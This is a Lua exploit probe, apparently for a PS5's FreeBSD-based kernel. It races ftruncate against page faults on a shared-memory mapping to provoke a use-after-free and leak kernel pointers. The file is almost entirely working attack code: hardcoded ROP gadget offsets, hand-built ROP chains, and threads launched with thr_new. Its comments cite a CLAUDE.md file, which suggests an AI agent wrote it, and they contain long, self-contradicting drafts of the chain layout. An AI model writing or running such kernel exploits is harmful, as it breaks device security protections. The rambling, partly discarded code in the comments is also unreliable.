-- CRASH_CLASS: HIGH
-- PROBE 1100a: SHM ftruncate race — concurrent resize vs page fault on MAP_SHARED
--
-- Context: CVE-2026-49417 was a sound(4) mmap UAF from racing buffer resize with
-- mmap access. We have working shm_open + ftruncate + mmap(MAP_SHARED). If
-- ftruncate shrinks a shm object while another thread faults on the now-gone page,
-- the vm_object's page list may reference freed pages. FreeBSD 11-based kernels
-- (r230171) predate many vm_object locking fixes.
--
-- Attack: Thread A repeatedly ftruncates between large and small. Thread B
-- repeatedly accesses pages near the boundary. If the kernel doesn't hold
-- vm_object lock during the entire page fault path, we get a UAF.
--
-- We use child thread ROP chains for the racing threads and the parent monitors
-- for kernel pointer leaks or anomalies through the mapped region.

print("=== PROBE 1100a: SHM FTRUNCATE RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Get eboot base for gadgets
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local info_buf = memory.alloc(0x200)
safe_wd(info_buf, 0x160)
local sc593 = make_syscall(593)
pcall(function() sc593(uint64(0), info_buf) end)
local eboot_lo = safe_rd(info_buf + 0x108)
local eboot_hi = safe_rd(info_buf + 0x10C)
local eboot_base = uint64(string.format("0x%X%08X", eboot_hi or 0, eboot_lo or 0))
print(string.format("[0] eboot_base=%s", tostring(eboot_base)))

-- Gadgets
local pop_rax_ret   = eboot_base + uint64(0x992)
local pop_rdi_ret   = eboot_base + uint64(0xC9DFE)
local pop_rsi_ret   = eboot_base + uint64(0xD77D)
local pop_rdx_ret   = eboot_base + uint64(0x3B02D7)
local pop_rcx_ret   = eboot_base + uint64(0xE64)
local pop_r8_ret    = eboot_base + uint64(0x991)
local bare_ret      = eboot_base + uint64(0x42)
local mov_rdi_rax_ret = eboot_base + uint64(0x92C67) -- mov [rdi],rax;ret
local syscall_ret   = uint64(fn_str) -- libkernel syscall stub

-- Syscall numbers
local SYS_SYSARCH   = uint64(165)
local SYS_SHM_OPEN  = uint64(482)
local SYS_FTRUNCATE = uint64(480)
local SYS_MMAP      = uint64(477)
local SYS_MUNMAP    = uint64(73)
local SYS_THR_NEW   = uint64(455)
local SYS_THR_EXIT  = uint64(431)
local SYS_CLOSE     = uint64(6)
local SYS_WRITE     = uint64(4)
local SYS_READ      = uint64(3)
local SYS_GETPID    = uint64(20)

local SET_FSBASE = uint64(129)

-- Allocate shared state
local shared = memory.alloc(0x1000)
for i = 0, 0xFF do safe_wd(shared + i*4, 0) end

-- shared+0x00: stop flag
-- shared+0x04: thread A iteration count
-- shared+0x08: thread B iteration count
-- shared+0x0C: thread B fault count (sentinel changed)
-- shared+0x10: thread B kptr count
-- shared+0x14: shm fd (set by parent)
-- shared+0x18: mmap address lo (set by parent)
-- shared+0x1C: mmap address hi (set by parent)

local sc_pid = make_syscall(20)
local pid = to_num(sc_pid())
print(string.format("[0] pid=%d", pid))

-- Step 1: Create shm object
local SHM_ANON = uint64(1) -- FreeBSD SHM_ANON
local O_RDWR = uint64(2)
local sc_shm = make_syscall(482)
local shm_fd = to_num(sc_shm(SHM_ANON, uint64(0x602), uint64(0x1FF)))
print(string.format("[1] shm_open fd=%d", shm_fd))
if shm_fd < 0 then
    print("[!] shm_open failed")
    print("=== PROBE 1100a FAILED ===")
    return
end

-- Step 2: ftruncate to initial large size (256KB = 16 pages on PS5 16KB pages)
local LARGE_SIZE = 0x40000  -- 256KB
local SMALL_SIZE = 0x4000   -- 16KB (1 page)
local sc_ftrunc = make_syscall(480)
local tr = to_num(sc_ftrunc(uint64(shm_fd), uint64(LARGE_SIZE)))
print(string.format("[2] ftruncate(%d, 0x%X) ret=%d", shm_fd, LARGE_SIZE, tr))

-- Step 3: mmap the shm object MAP_SHARED
local sc_mmap = make_syscall(477)
local MAP_SHARED = uint64(1)
local PROT_RW = uint64(3)
local map_addr = sc_mmap(uint64(0), uint64(LARGE_SIZE), PROT_RW, MAP_SHARED, uint64(shm_fd), uint64(0))
local map_lo = to_num(map_addr)
local map_h, map_l = get_hi_lo(map_addr)
print(string.format("[3] mmap=%s", tostring(map_addr)))

if map_h == 0 and map_l == 0 then
    print("[!] mmap failed")
    print("=== PROBE 1100a FAILED ===")
    return
end

-- Write sentinel pattern to all pages
for page = 0, (LARGE_SIZE / 0x4000) - 1 do
    local off = page * 0x4000
    safe_wd(map_addr + uint64(off), 0xAA000000 + page)
    safe_wd(map_addr + uint64(off + 4), 0xBB000000 + page)
end
print("[4] sentinels written")

-- Store shm fd and map address in shared state
safe_wd(shared + 0x14, shm_fd)
safe_wd(shared + 0x18, map_l)
safe_wd(shared + 0x1C, map_h)

-- Helper: build a child ROP chain that does sysarch(SET_FSBASE) then loops a syscall
local function build_ftruncate_racer(stack_base, stack_size, iterations)
    -- This child repeatedly calls ftruncate alternating between LARGE and SMALL
    local rsp = stack_base + uint64(stack_size)
    -- Align to 16 and subtract 8
    local rsp_val = to_num(rsp)
    rsp_val = math.floor(rsp_val / 16) * 16 - 8
    rsp = uint64(rsp_val)

    -- Build chain backwards from the end
    -- We need: sysarch(SET_FSBASE, &fake_tcb) then loop ftruncate

    -- Allocate fake TCB (self-referencing 4KB)
    local tcb = memory.alloc(0x1000)
    safe_wq(tcb, tcb) -- self-reference at offset 0

    -- Allocate fsbase pointer
    local fsbase_ptr = memory.alloc(8)
    safe_wq(fsbase_ptr, tcb)

    -- Build the chain on the stack
    local chain = {}

    -- 1. sysarch(SET_FSBASE=129, &fake_tcb)
    table.insert(chain, pop_rax_ret)
    table.insert(chain, SYS_SYSARCH)  -- 165
    table.insert(chain, pop_rdi_ret)
    table.insert(chain, SET_FSBASE)    -- 129
    table.insert(chain, pop_rsi_ret)
    table.insert(chain, uint64(to_num(fsbase_ptr)))
    table.insert(chain, syscall_ret)

    -- 2. Loop: for each iteration, ftruncate to SMALL then LARGE
    -- We can't do a real loop in ROP, so we unroll N iterations
    local ITERS = iterations or 200
    for i = 1, ITERS do
        -- ftruncate(shm_fd, SMALL_SIZE)
        table.insert(chain, pop_rax_ret)
        table.insert(chain, SYS_FTRUNCATE)
        table.insert(chain, pop_rdi_ret)
        table.insert(chain, uint64(shm_fd))
        table.insert(chain, pop_rsi_ret)
        table.insert(chain, uint64(SMALL_SIZE))
        table.insert(chain, syscall_ret)

        -- increment counter: we can't easily do this in pure ROP without
        -- a mov [addr], reg gadget sequence, so we skip the counter

        -- ftruncate(shm_fd, LARGE_SIZE)
        table.insert(chain, pop_rax_ret)
        table.insert(chain, SYS_FTRUNCATE)
        table.insert(chain, pop_rdi_ret)
        table.insert(chain, uint64(shm_fd))
        table.insert(chain, pop_rsi_ret)
        table.insert(chain, uint64(LARGE_SIZE))
        table.insert(chain, syscall_ret)
    end

    -- 3. Write completion marker
    table.insert(chain, pop_rax_ret)
    table.insert(chain, uint64(0xDEAD1100))
    table.insert(chain, pop_rdi_ret)
    table.insert(chain, uint64(to_num(shared + 0x04)))
    table.insert(chain, mov_rdi_rax_ret)

    -- 4. thr_exit(0)
    table.insert(chain, pop_rax_ret)
    table.insert(chain, SYS_THR_EXIT)
    table.insert(chain, pop_rdi_ret)
    table.insert(chain, uint64(0))
    table.insert(chain, syscall_ret)

    -- Write chain to stack (from top down)
    local chain_start = rsp - uint64(#chain * 8)
    for idx, val in ipairs(chain) do
        safe_wq(chain_start + uint64((idx-1) * 8), val)
    end

    return chain_start, tcb, fsbase_ptr
end

-- Check chain size feasibility
-- Each ftruncate pair = 12 qwords = 96 bytes. 200 iters = 19200 bytes + overhead
-- 2 MiB stack = plenty
local RACE_ITERS = 500
local chain_qwords = 7 + (RACE_ITERS * 12) + 4 + 4 -- sysarch + loop + marker + exit
print(string.format("[5] chain size: %d qwords = %d bytes", chain_qwords, chain_qwords * 8))

if chain_qwords * 8 > 0x180000 then
    RACE_ITERS = 100
    print("[5] reduced to 100 iterations to fit stack")
end

-- Allocate child stacks
local STACK_SIZE = 0x200000 -- 2 MiB
local child_stack_a = memory.alloc(STACK_SIZE)
local child_stack_b = memory.alloc(STACK_SIZE)

-- Build Thread A: ftruncate racer
local rsp_a, tcb_a, fsb_a = build_ftruncate_racer(child_stack_a, STACK_SIZE, RACE_ITERS)
print(string.format("[6] thread A chain at %s (%d iters)", tostring(rsp_a), RACE_ITERS))

-- Build Thread B: page toucher
-- This thread reads pages near the ftruncate boundary to trigger page faults
-- during the shrink window
local function build_page_toucher(stack_base, stack_size, iterations)
    local rsp = stack_base + uint64(stack_size)
    local rsp_val = to_num(rsp)
    rsp_val = math.floor(rsp_val / 16) * 16 - 8
    rsp = uint64(rsp_val)

    local tcb = memory.alloc(0x1000)
    safe_wq(tcb, tcb)
    local fsbase_ptr = memory.alloc(8)
    safe_wq(fsbase_ptr, tcb)

    -- We need a gadget that reads from an address. We have:
    -- mov rax,[rax]; ret at eboot+0x1EEBB
    local mov_rax_deref_rax = eboot_base + uint64(0x1EEBB)

    -- Target: read from page 2 (offset 0x8000) which is right at the boundary
    -- when ftruncate shrinks to SMALL_SIZE (0x4000 = 1 page)
    -- Pages 1+ become invalid during the shrink window
    local target_page = map_addr + uint64(0x8000) -- page index 2

    local chain = {}

    -- sysarch(SET_FSBASE)
    table.insert(chain, pop_rax_ret)
    table.insert(chain, SYS_SYSARCH)
    table.insert(chain, pop_rdi_ret)
    table.insert(chain, SET_FSBASE)
    table.insert(chain, pop_rsi_ret)
    table.insert(chain, uint64(to_num(fsbase_ptr)))
    table.insert(chain, syscall_ret)

    -- Loop: repeatedly touch pages near the boundary
    -- We use the read syscall to touch the page (read from /dev/zero into the mapped page)
    -- This triggers a page fault if the page was removed by ftruncate
    -- Actually, simpler: just load from the address via mov rax,[rax]
    -- If the page is gone, we get SIGBUS/SIGSEGV (child dies)
    -- If the page is present but was freed and reallocated, we read stale/new data

    -- Better approach: use write(socketpair_fd, mapped_page_addr, 8) which will
    -- copyin from the mapped address. If the page is gone, copyin fails gracefully
    -- and write returns -1. If it reads stale data, the data goes to the socket.

    -- Actually we don't have a socketpair fd in the child easily.
    -- Let's use a different approach: read the sentinel via the mapping and
    -- write it to the shared page via mov [rdi], rax; ret

    local ITERS = iterations or 200
    for i = 1, ITERS do
        -- Read from boundary page
        table.insert(chain, pop_rax_ret)
        table.insert(chain, target_page)
        table.insert(chain, mov_rax_deref_rax)  -- rax = *target_page (may fault)
        -- Write result to shared area
        table.insert(chain, pop_rdi_ret)
        table.insert(chain, uint64(to_num(shared + 0x100 + ((i-1) % 64) * 8)))
        table.insert(chain, mov_rdi_rax_ret) -- shared[i] = rax
    end

    -- Write completion marker
    table.insert(chain, pop_rax_ret)
    table.insert(chain, uint64(0xDEAD1101))
    table.insert(chain, pop_rdi_ret)
    table.insert(chain, uint64(to_num(shared + 0x08)))
    table.insert(chain, mov_rdi_rax_ret)

    -- thr_exit
    table.insert(chain, pop_rax_ret)
    table.insert(chain, SYS_THR_EXIT)
    table.insert(chain, pop_rdi_ret)
    table.insert(chain, uint64(0))
    table.insert(chain, syscall_ret)

    local chain_start = rsp - uint64(#chain * 8)
    for idx, val in ipairs(chain) do
        safe_wq(chain_start + uint64((idx-1) * 8), val)
    end

    return chain_start, tcb, fsbase_ptr
end

local rsp_b, tcb_b, fsb_b = build_page_toucher(child_stack_b, STACK_SIZE, RACE_ITERS)
print(string.format("[7] thread B chain at %s (%d iters)", tostring(rsp_b), RACE_ITERS))

-- Build thr_param structs
local param_a = memory.alloc(0x40)
local param_b = memory.alloc(0x40)
local tid_a_ptr = memory.alloc(8)
local tid_b_ptr = memory.alloc(8)

-- Zero them
for i = 0, 0x3F do safe_wd(param_a + i, 0) end
for i = 0, 0x3F do safe_wd(param_b + i, 0) end

-- Thread A param: start_func=pop_rax_ret (first gadget), arg=0, stack, size
safe_wq(param_a + 0x00, pop_rax_ret)         -- start_func (RIP)
safe_wq(param_a + 0x08, uint64(0))            -- arg (rdi)
safe_wq(param_a + 0x10, uint64(to_num(rsp_a))) -- stack_base (actually RSP)
safe_wq(param_a + 0x18, uint64(0))            -- stack_size
safe_wq(param_a + 0x30, uint64(to_num(tid_a_ptr)))

-- Wait, thr_new sets RSP from stack_base+stack_size. Let me fix this.
-- thr_param: start_func(+0), arg(+8), stack_base(+0x10), stack_size(+0x18), child_tid(+0x30)
-- RSP = ((stack_base + stack_size) & ~0xF) - 8
-- So we need stack_base = child_stack_a, stack_size = (rsp_a - child_stack_a)
-- Actually, easier: set stack_base to point just below our chain and stack_size=0
-- so RSP = stack_base - 8... no that's wrong too.
--
-- The start_func is called as start_func(arg). The function entry is at start_func
-- with rdi=arg and RSP pointing to our chain. So we need:
-- stack_base = address below our chain
-- stack_size = difference so that ((base+size) & ~0xF) - 8 = rsp_a

-- Let's compute: we want RSP = rsp_a when the child starts
-- ((stack_base + stack_size) & ~0xF) - 8 = rsp_a
-- So stack_base + stack_size = (rsp_a + 8) aligned to 16
-- Set stack_base = child_stack_a, stack_size = ((rsp_a + 8 + 15) & ~15) - child_stack_a

-- Actually the simplest approach from the confirmed probes:
-- start_func = pop_rax_ret as the entry point
-- The child's RSP will be set up by thr_new, and the first thing at RSP should be
-- the next value for pop_rax to pop.
-- But thr_new calls start_func(arg), so RSP at entry = the return address slot
-- We need the return address to be the next gadget in our chain.

-- From CLAUDE.md: RSP = ((stack_base + stack_size) & ~0xF) - 8
-- start_func is called with a CALL-like semantic: RSP has the return address at top
-- Actually thr_new doesn't CALL, it sets RIP=start_func and RSP as computed.
-- So RSP[0] is whatever is at that address. We need our chain to START at RSP.

-- So: set stack_base = address of our chain data, stack_size small enough
-- Actually the chain IS on child_stack_a. rsp_a points into child_stack_a.
-- Set stack_base such that ((stack_base + stack_size) & ~0xF) - 8 = rsp_a
-- Easiest: stack_base = rsp_a + 8, stack_size = 0
-- Then ((rsp_a+8+0) & ~0xF) - 8... only works if rsp_a+8 is 16-aligned

-- From the existing probes, the pattern is:
-- stack_base = child_stack_a (the allocated region)
-- stack_size = STACK_SIZE (2 MiB)
-- The chain is written at the TOP of the stack
-- RSP = ((child_stack_a + STACK_SIZE) & ~0xF) - 8

-- And the chain should start at that RSP. Let me recalculate rsp_a:
local rsp_top_a = to_num(child_stack_a) + STACK_SIZE
rsp_top_a = math.floor(rsp_top_a / 16) * 16 - 8

-- We need to rewrite the chain to start at rsp_top_a
-- Let me just rebuild properly

-- Clear and rebuild
for i = 0, STACK_SIZE/4 - 1 do
    -- Only zero the top portion where the chain goes
    if i * 4 >= STACK_SIZE - 0x20000 then
        safe_wd(child_stack_a + uint64(i * 4), 0)
    end
end

-- Rebuild chain A at the correct position
local function write_chain_at(base_addr, chain_data)
    for idx, val in ipairs(chain_data) do
        safe_wq(base_addr + uint64((idx - 1) * 8), val)
    end
    return #chain_data
end

-- Build chain A data
local chain_a = {}
-- sysarch(SET_FSBASE)
table.insert(chain_a, SYS_SYSARCH)     -- popped by pop_rax
table.insert(chain_a, syscall_ret)      -- ret from pop_rax goes here
table.insert(chain_a, pop_rdi_ret)      -- ret from syscall goes here
table.insert(chain_a, SET_FSBASE)
table.insert(chain_a, pop_rsi_ret)
table.insert(chain_a, uint64(to_num(fsb_a)))
table.insert(chain_a, bare_ret)         -- re-enter syscall...

-- Actually this is getting complicated. Let me use the simpler pattern from the confirmed probes.
-- From docs/CHAIN_14_10.md: RIP = pop_rax_ret, stack = [num][syscall_ret][pop_rax_ret][num]...

-- The child starts with RIP = pop_rax_ret, RSP = top of chain
-- pop rax loads chain[0], ret jumps to chain[1]
-- If chain[1] = syscall_ret, syscall executes with rax=chain[0]
-- After syscall, ret jumps to chain[2]

-- For a full syscall with args:
-- [SYS_NUM, syscall_ret, pop_rdi_ret, arg1, pop_rsi_ret, arg2, ..., pop_rax_ret, ...]

-- Wait, that's wrong. The order needs to be:
-- pop_rax_ret (RIP entry point)
-- RSP[0] = SYS_NUM          <- pop rax loads this
-- RSP[1] = pop_rdi_ret      <- ret goes here (NOT syscall yet, need to set args first)
-- RSP[2] = arg1             <- pop rdi loads this
-- RSP[3] = pop_rsi_ret      <- ret goes here
-- RSP[4] = arg2             <- pop rsi loads this
-- RSP[5] = syscall_ret      <- ret goes here, executes syscall with rax, rdi, rsi set
-- RSP[6] = next_gadget      <- ret after syscall

-- Let me just use a clean helper function
local function make_chain_syscall(chain, sysnum, args)
    -- Set rax first
    table.insert(chain, sysnum)       -- value for pop_rax
    -- Set args in order: rdi, rsi, rdx, rcx, r8
    local arg_pops = {pop_rdi_ret, pop_rsi_ret, pop_rdx_ret, pop_rcx_ret, pop_r8_ret}
    -- But we need pop_rax_ret BEFORE syscall. Let me restructure:
    -- Actually the chain already has the last gadget's ret pointing here.
    -- So chain[current] is what the PREVIOUS ret jumps to.
    -- We need: set args, then set rax, then syscall.

    -- Pattern: [pop_rdi_ret, arg1, pop_rsi_ret, arg2, ..., pop_rax_ret, sysnum, syscall_ret]
    -- NO wait. The entry point is pop_rax_ret. After that the chain items are consumed.
    -- Let me think again.

    -- The FIRST instruction at chain start is executed after the previous ret.
    -- We need to INSERT gadgets in execution order:
    -- pop_rdi_ret -> arg1 -> pop_rsi_ret -> arg2 -> ... -> pop_rax_ret -> sysnum -> syscall_ret

    -- But since pop_rax_ret is the ENTRY RIP for the whole thread, the first thing
    -- on the stack is what pop_rax will load. So for the first call:
    -- RSP[0] = sysnum (popped by entry RIP = pop_rax_ret)
    -- RSP[1] = pop_rdi_ret (ret target after pop_rax)
    -- RSP[2] = arg1 (popped by pop_rdi)
    -- RSP[3] = pop_rsi_ret (ret target after pop_rdi)
    -- RSP[4] = arg2
    -- RSP[5] = syscall_ret
    -- RSP[6] = pop_rax_ret (start of next syscall)

    -- For SUBSEQUENT calls, the pattern is the same because each ends with
    -- pop_rax_ret which starts the next one.

    -- So for each syscall: push sysnum first, then args, then syscall, then pop_rax for next

    -- Actually for the first call the entry is pop_rax_ret so it pops sysnum.
    -- For subsequent calls, we end the previous with pop_rax_ret.
    -- Either way, the first item is the sysnum.

    -- Ah but we need args set BEFORE the syscall. The order of pops doesn't matter
    -- as long as they all happen before syscall. So:
    -- sysnum, pop_rdi_ret, arg1, pop_rsi_ret, arg2, ..., syscall_ret
    -- NO! After popping sysnum, ret goes to the NEXT item. If next = pop_rdi_ret,
    -- it pops arg1 from the stack, then rets to pop_rsi_ret, etc.
    -- After all args set, we need to execute syscall. But rax was set first and
    -- the intermediate pops DON'T change rax. So:
    -- sysnum, [arg gadgets], syscall_ret, pop_rax_ret (for next)
    -- Wait, after pop_rax pops sysnum, ret jumps to the NEXT qword on stack.
    -- That next qword needs to be an ADDRESS to jump to, not data.

    -- Correct pattern for FIRST syscall (RIP = pop_rax_ret):
    -- Stack: [sysnum, pop_rdi_ret, arg1, pop_rsi_ret, arg2, syscall_ret, ...]
    -- Execution: pop rax=sysnum, ret->pop_rdi_ret, pop rdi=arg1, ret->pop_rsi_ret,
    --           pop rsi=arg2, ret->syscall_ret, syscall(rax=sysnum,rdi=arg1,rsi=arg2), ret->...

    -- YES that's right. And for next syscall, end with pop_rax_ret as the ret target.

    -- WAIT but pop_rdi_ret also pops rbp. CLAUDE.md says pop_rdi_ret is at +0xC9DFE.
    -- Let me check: the table says pop_rdi_ret(+0xC9DFE). But also pop_rdi_rbp_ret(+0x169).
    -- And pop_rsi_rbp_ret(+0x78). If pop_rdi_ret at +0xC9DFE is a PURE pop rdi; ret
    -- (no rbp), then we're fine. The naming suggests it IS pure. Let me use it.

    table.insert(chain, sysnum) -- popped by pop_rax
    for i, arg in ipairs(args or {}) do
        if i == 1 then table.insert(chain, pop_rdi_ret) table.insert(chain, arg)
        elseif i == 2 then table.insert(chain, pop_rsi_ret) table.insert(chain, arg)
        elseif i == 3 then table.insert(chain, pop_rdx_ret) table.insert(chain, arg)
        elseif i == 4 then table.insert(chain, pop_rcx_ret) table.insert(chain, arg)
        elseif i == 5 then table.insert(chain, pop_r8_ret) table.insert(chain, arg)
        end
    end
    table.insert(chain, syscall_ret)
    table.insert(chain, pop_rax_ret) -- set up for next call
end

-- Rebuild chain A properly
chain_a = {}

-- sysarch(SET_FSBASE=129, &tcb_ptr)
make_chain_syscall(chain_a, SYS_SYSARCH, {SET_FSBASE, uint64(to_num(fsb_a))})

-- Loop: ftruncate small, ftruncate large
for i = 1, RACE_ITERS do
    make_chain_syscall(chain_a, SYS_FTRUNCATE, {uint64(shm_fd), uint64(SMALL_SIZE)})
    make_chain_syscall(chain_a, SYS_FTRUNCATE, {uint64(shm_fd), uint64(LARGE_SIZE)})
end

-- Write completion marker via mov [rdi], rax; ret
-- rax is currently set by the last pop_rax_ret
-- We need: pop_rax_ret already emitted by make_chain_syscall, so:
table.insert(chain_a, uint64(0xDEAD1100)) -- rax = marker
table.insert(chain_a, pop_rdi_ret)
table.insert(chain_a, uint64(to_num(shared + 0x04)))
table.insert(chain_a, mov_rdi_rax_ret)

-- thr_exit
table.insert(chain_a, pop_rax_ret)
table.insert(chain_a, SYS_THR_EXIT)
table.insert(chain_a, pop_rdi_ret)
table.insert(chain_a, uint64(0))
table.insert(chain_a, syscall_ret)

-- Write chain A to stack top
local chain_a_start = uint64(rsp_top_a)
write_chain_at(chain_a_start, chain_a)
print(string.format("[8] chain A: %d entries = %d bytes at %s", #chain_a, #chain_a*8, tostring(chain_a_start)))

-- Build chain B: page reader
-- Thread B repeatedly reads from pages beyond the SMALL_SIZE boundary
-- If ftruncate shrinks and the page is gone, the read may fault (child dies)
-- or read stale data from a reused page (success = potential kernel data)
local rsp_top_b = to_num(child_stack_b) + STACK_SIZE
rsp_top_b = math.floor(rsp_top_b / 16) * 16 - 8

-- B uses mov rax,[rax]; ret to read from the boundary page
-- and mov [rdi],rax; ret to store the result
local chain_b = {}

-- sysarch(SET_FSBASE)
make_chain_syscall(chain_b, SYS_SYSARCH, {SET_FSBASE, uint64(to_num(fsb_b))})

-- Read loop: touch pages 1-3 (offsets 0x4000, 0x8000, 0xC000)
-- These are the pages that disappear when ftruncate shrinks to SMALL_SIZE
local mov_rax_deref_rax = eboot_base + uint64(0x1EEBB) -- mov rax,[rax]; ret

for i = 1, RACE_ITERS do
    -- Read from page 1 (offset 0x4000) - right at the boundary
    local target = map_addr + uint64(0x4000)

    -- We can't use make_chain_syscall for a non-syscall gadget sequence.
    -- Pattern: pop_rax_ret is already pending from prev make_chain_syscall
    -- So next value is popped into rax.
    table.insert(chain_b, uint64(to_num(target))) -- rax = target addr
    table.insert(chain_b, mov_rax_deref_rax)       -- rax = *target
    table.insert(chain_b, pop_rdi_ret)
    table.insert(chain_b, uint64(to_num(shared + 0x100 + ((i-1) % 64) * 8)))
    table.insert(chain_b, mov_rdi_rax_ret)         -- store result
    table.insert(chain_b, pop_rax_ret)             -- set up for next
end

-- Completion marker
table.insert(chain_b, uint64(0xDEAD1101))
table.insert(chain_b, pop_rdi_ret)
table.insert(chain_b, uint64(to_num(shared + 0x08)))
table.insert(chain_b, mov_rdi_rax_ret)

-- thr_exit
table.insert(chain_b, pop_rax_ret)
table.insert(chain_b, SYS_THR_EXIT)
table.insert(chain_b, pop_rdi_ret)
table.insert(chain_b, uint64(0))
table.insert(chain_b, syscall_ret)

local chain_b_start = uint64(rsp_top_b)
write_chain_at(chain_b_start, chain_b)
print(string.format("[9] chain B: %d entries = %d bytes at %s", #chain_b, #chain_b*8, tostring(chain_b_start)))

-- Set up thr_param structs
-- Thread A
for i = 0, 0x37 do safe_wd(param_a + i, 0) end
safe_wq(param_a + 0x00, pop_rax_ret)              -- start_func (entry RIP)
safe_wq(param_a + 0x08, uint64(0))                -- arg (unused, rdi)
safe_wq(param_a + 0x10, child_stack_a)             -- stack_base
safe_wq(param_a + 0x18, uint64(STACK_SIZE))        -- stack_size
safe_wq(param_a + 0x30, uint64(to_num(tid_a_ptr))) -- child_tid

-- Thread B
for i = 0, 0x37 do safe_wd(param_b + i, 0) end
safe_wq(param_b + 0x00, pop_rax_ret)
safe_wq(param_b + 0x08, uint64(0))
safe_wq(param_b + 0x10, child_stack_b)
safe_wq(param_b + 0x18, uint64(STACK_SIZE))
safe_wq(param_b + 0x30, uint64(to_num(tid_b_ptr)))

-- Launch both threads
print("[10] launching threads...")
local sc_thr = make_syscall(455)

-- Start thread A (ftruncate racer) first
local ret_a = to_num(sc_thr(uint64(to_num(param_a)), uint64(0x38)))
local tid_a = safe_rd(tid_a_ptr)
print(string.format("[10] thread A: ret=%d tid=%d", ret_a, tid_a or -1))

-- Small delay then start thread B (page toucher)
-- We can't sleep easily, just launch immediately
local ret_b = to_num(sc_thr(uint64(to_num(param_b)), uint64(0x38)))
local tid_b = safe_rd(tid_b_ptr)
print(string.format("[10] thread B: ret=%d tid=%d", ret_b, tid_b or -1))

-- Wait for completion (poll shared markers)
print("[11] waiting for threads...")
local timeout = 3000 -- 3000 iterations
for wait = 1, timeout do
    local done_a = safe_rd(shared + 0x04)
    local done_b = safe_rd(shared + 0x08)

    if done_a == 0xDEAD1100 and done_b == 0xDEAD1101 then
        print(string.format("[11] both done at iter %d", wait))
        break
    end

    if wait == timeout then
        print(string.format("[11] timeout: A=%s B=%s",
            string.format("0x%08X", done_a or 0),
            string.format("0x%08X", done_b or 0)))
        -- Thread B probably died from SIGBUS/SIGSEGV touching an unmapped page
        -- That itself is interesting - means we hit the race window
        if done_a == 0xDEAD1100 and (done_b or 0) == 0 then
            print("[!] Thread B died - likely hit unmapped page during ftruncate!")
            print("[!] This confirms the race window exists")
        end
    end
end

-- Check results: scan shared buffer for kernel pointers or anomalies
print("")
print("[12] scanning results...")
local kptr_count = 0
local anomaly_count = 0
local zero_count = 0
local sentinel_count = 0

for i = 0, 63 do
    local val = safe_rq(shared + 0x100 + i * 8)
    if val then
        local h, l = get_hi_lo(val)
        if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
            kptr_count = kptr_count + 1
            print(string.format("  [KPTR!] slot %d: 0x%08X%08X", i, h, l))
        elseif h == 0 and l == 0 then
            zero_count = zero_count + 1
        elseif l == (0xAA000000 + 1) or l == (0xBB000000 + 1) then
            sentinel_count = sentinel_count + 1
        else
            -- Not a sentinel, not zero, not a kernel pointer
            -- Could be stale data from a freed page
            if h ~= 0 or (l ~= 0xAA000001 and l ~= 0xBB000001 and l ~= 0) then
                anomaly_count = anomaly_count + 1
                if anomaly_count <= 10 then
                    print(string.format("  [ANOM] slot %d: 0x%08X%08X", i, h, l))
                end
            end
        end
    end
end

print(string.format("[12] kptrs=%d anomalies=%d sentinels=%d zeros=%d",
    kptr_count, anomaly_count, sentinel_count, zero_count))

-- Also re-read the mapped region for stale data
print("")
print("[13] scanning mapped region...")
local region_kptrs = 0
local region_anomalies = 0
for page = 0, (LARGE_SIZE / 0x4000) - 1 do
    local off = page * 0x4000
    local val = safe_rq(map_addr + uint64(off))
    if val then
        local h, l = get_hi_lo(val)
        local expected_lo = 0xAA000000 + page
        -- Check for stale kernel data
        if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
            region_kptrs = region_kptrs + 1
            print(string.format("  [KPTR!] page %d: 0x%08X%08X", page, h, l))
        elseif l ~= expected_lo and l ~= 0 and h ~= 0 then
            region_anomalies = region_anomalies + 1
            if region_anomalies <= 5 then
                print(string.format("  [ANOM] page %d: 0x%08X%08X (expected 0x%08X)", page, h, l, expected_lo))
            end
        end
    end
end
print(string.format("[13] region kptrs=%d anomalies=%d", region_kptrs, region_anomalies))

-- Alive check
local alive_pid = to_num(sc_pid())
print(string.format("[14] alive pid=%d", alive_pid))

print("")
print("=== PROBE 1100a COMPLETE ===")
